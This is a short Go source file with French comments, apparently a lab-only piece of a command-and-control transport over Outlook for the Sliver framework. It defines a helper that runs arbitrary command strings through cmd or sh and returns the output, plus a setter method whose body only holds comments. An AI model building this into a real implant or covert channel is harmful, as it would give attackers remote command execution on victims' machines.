//go:build windows
// +build windows

package outlook

/*
	VERSION LAB - Permet l'exécution réelle des commandes
	À utiliser UNIQUEMENT pour les tests de lab
*/

import (
	"os/exec"
	"runtime"
)

// ExecuteFunc type pour l'exécution custom de commandes
type ExecuteFunc func(command string) (string, error)

// SetExecuteFunc permet de définir une fonction custom pour exécuter les commandes
// Utile pour le lab/testing
func (t *OutlookTransport) SetExecuteFunc(fn ExecuteFunc) {
	// Cette méthode permet d'override executeCommand pour le lab
	// Dans le code réel intégré à Sliver, executeCommand appellerait
	// le système de tasks de Sliver
}

// DefaultExecuteFunc exécute une commande système réelle
// ATTENTION: À utiliser uniquement pour les tests !
func DefaultExecuteFunc(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}
